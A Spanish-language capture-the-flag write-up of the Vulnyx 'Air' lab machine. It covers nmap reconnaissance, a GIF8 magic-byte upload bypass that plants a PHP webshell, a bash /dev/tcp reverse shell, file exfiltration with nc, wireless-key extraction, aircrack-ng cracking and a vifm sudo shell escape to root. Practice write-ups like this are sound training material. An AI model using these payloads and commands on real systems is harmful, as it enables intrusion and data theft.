---
title: Vulnyx - Air
author: estx
date: 2024-05-04 12:10:00 +0800
categories: [Writeup, Vulnyx, Easy]
tags: [Linux, 'File Upload', 'Binary Abusing', 'Nginx']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Easy/Air/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hook Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnyx.

Técnicas usadas: **File Upload, Binary Abusing**

### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.72	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```

a. Enumeramos los puertos que están abiertos.

```bash
❯ nmap -p- -sS --min-rate 5000 -Pn -n 192.168.100.72 -oG ports

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

b. Vemos las versiones de los servicios que se están ejecutando

```bash
❯ nmap -p22,80,8080 -sCV 192.168.100.72 -oN versions

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 0e:95:f2:88:f3:0f:ca:38:ec:da:3c:c0:cd:19:20:41 (ECDSA)
|_  256 53:21:e1:34:a6:f0:70:2b:87:e7:cf:3d:6b:85:9d:64 (ED25519)
80/tcp   open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
8080/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://air.nyx:8080/
|_http-open-proxy: Proxy might be redirecting requests
```

* Vemos el dominio `air.nyx` el cual añadimos el `/etc/hosts`

```bash
❯ cat /etc/hosts

...
192.168.100.72	air.nyx
```

c. Al visitar el sitio web del puerto **8080**, tenemos un apartado para subir archivos. Si intentamos subir algunos archivos veremos el mensaje 'The file is not a valid image.', pero, si cambios los 'magic numbers' de un archivo **.php** por `GIF8` nos dejará subir una webshell

```php
GIF8

<?php system($_GET['cmd']); ?>
```

![Shell](/assets/images/Vulnyx/Easy/Air/01-shell.png)

d. Hacemos fuzzing para identificar el directorio en el que se suben los archivos

```bash
❯ dirsearch -u 'http://air.nyx:8080/'

<SNIP>
[17:24:03] 403 -  555B  - /uploads/
```

* Ahora podemos ejecutar comandos en la máquina víctima

```bash
❯ curl -s -X GET "http://air.nyx:8080/uploads/shell.php?cmd=whoami"
GIF8

www-data
```

e. Nos entablamos una reverse shell

```bash
❯ curl -s -X GET "http://air.nyx:8080/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/192.168.100.55/4444%200>%261'"
------------------------------------------------------------------------------------
❯ nc -lvnp 4444
www-data@air:~/air/uploads$
```

### Escalada de Privilegios 💹

1. Hacemos el tratamiento de la TTY para trabajar de manera más cómoda con la reverse shell

```bash
www-data@air:~/air/uploads$ script /dev/null -c bash
www-data@air:~/air/uploads$ ^Z
[1]  + 15681 suspended  nc -lvnp 4444
❯ stty raw -echo;fg
[1]  + 15681 continued  nc -lvnp 4444
                                     reset xterm

www-data@air:~/air/uploads$ export TERM=xterm-256color
www-data@air:~/air/uploads$ source /etc/skel/.bashrc
```

* Listamos los permisos a nivel de sudoers de este usuario

```bash
www-data@air:~/tmp$ sudo -l

User www-data may run the following commands on air:
    (sam) NOPASSWD: /opt/air-repeater
```

* Al ejecutar este binario debemos obtener una contraseña, pero no la tenemos, por lo que buscamos archivos que puedan tener esta contraseña

2. Encontramos el archivo `backup-OpenWrt.tar.gz`

```bash
www-data@air:~/html/files/key/2023_router_backup$ ls
backup-OpenWrt.tar.gz
```

* Transferimos el este archivo a nuestra máquina

```bash
# Máquina Atacante
❯ nc -lvnp 4445 > backup-OpenWrt.tar.gz

# Máquina Air
www-data@air:~/html/files/key/2023_router_backup$ cat < backup-OpenWrt.tar.gz > /dev/tcp/[IP Máquina Atacante]/4445
```

* Descomprimimos el archivos y filtramos por palabras clave

```bash
❯ 7z x backup-OpenWrt.tar.gz
❯ tar -xf backup-OpenWrt.tar
❯ grep -E "key|pass" -r ./
./etc/opkg/keys/2f8b0b98e08306bf:untrusted comment: Public usign key for 21.02 release builds
./etc/profile:export HOME=$(grep -e "^${USER:-root}:" /etc/passwd | cut -d ":" -f 6)
./etc/profile:There is no root password defined on this device!
./etc/profile:Use the "passwd" command to set up a new password
./etc/config/wireless:  option key '42NsWajkZGlz'
./etc/config/luci-opkg: option passwd   "/etc/passwd"
./etc/config/uhttpd:    option key '/etc/uhttpd.key'
./etc/config/uhttpd:    option key_type 'ec'
./etc/config/rpcd:      option password '$p$root'
./etc/config/luci:      option passwd '/etc/passwd'
```

* Encontramos una posible contraseña `42NsWajkZGlz`

3. La usamos en el binario anterior y nos convertirmos en el usuario **sam**

```bash
www-data@air:~/html/files/key/2023_router_backup$ sudo -u sam /opt/air-repeater 
Enter the password: 42NsWajkZGlz
Correct password!
```

* Encontramos el archivo `Air-Master.zip`, lo transferimos a nuestra máquina

```bash
sam@air:/var/backups$ ls -al
-rw-------  1 xiao xiao    492 Nov  8 20:33 Air-Master.zip
```

* Al descomprimirlo solo hay un archivo `Air-Master-01.ivs`

> Los archivo **`.ivs`** contienen vectores de inicialización que son útiles para la generación de los datos cifrados en la red. Estos archivos pueden ser abiertos con `aircrack-ng`
{: .prompt-info }


```bash
aircrack-ng Air-Master-01.ivs -w /usr/share/wordlists/rockyou.txt

                          Aircrack-ng 1.7 

[00:00:01] <SNIP>/10303727 keys tested (6170.16 k/s) 

Time left: 27 minutes, 49 seconds                          0.03%

                    KEY FOUND! [ <SNIP> ]
```

4. Revisamos los permisos a nivel de sudoers de este usuario

```bash
sam@air:/var/backups$ sudo -l
Matching Defaults entries for sam on air:
User sam may run the following commands on air:
    (xiao) NOPASSWD: /usr/bin/vifm
sam@air:/var/backups$ sudo -u xiao /usr/bin/vifm
```

* Se abrirá un editor de texto, escribimos `!/bin/bash` y realizamos un **user pivoting** a `xiao`

5. Por último, la contraseña crackeada con **aircrack-ng**, nos servirá para acceder como root

```bash
xiao@air:~$ su root
Password: 
root@air:/home/xiao # 
```